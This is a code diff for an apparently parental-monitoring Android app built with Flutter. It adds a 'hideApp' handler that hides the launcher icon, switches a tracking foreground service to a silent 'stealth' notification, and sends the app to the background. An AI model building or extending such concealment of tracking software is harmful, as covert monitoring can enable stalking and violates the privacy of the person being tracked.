@@ -4,7 +4,10 @@ import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
 import android.content.ComponentName
+import android.content.Intent
 import android.content.pm.PackageManager
+import android.os.Build
+import com.parentalmonitor.child.services.TrackingForegroundService
 
 class MainActivity : FlutterActivity() {
     private val LAUNCHER_CHANNEL = "com.parental_monitor.app/launcher"
@@ -27,6 +30,22 @@ class MainActivity : FlutterActivity() {
                     "isIconHidden" -> {
                         val hidden = isAppIconHidden()
                         result.success(hidden)
+                    }
+                    "hideApp" -> {
+                        // 1. Hide launcher icon
+                        hideAppIcon()
+                        // 2. Switch service notification to silent channel (no status-bar icon)
+                        val svcIntent = Intent(this, TrackingForegroundService::class.java).apply {
+                            action = TrackingForegroundService.ACTION_STEALTH
+                        }
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            startForegroundService(svcIntent)
+                        } else {
+                            startService(svcIntent)
+                        }
+                        // 3. Move app to background
+                        moveTaskToBack(true)
+                        result.success(true)
                     }
                     else -> result.notImplemented()
                 }
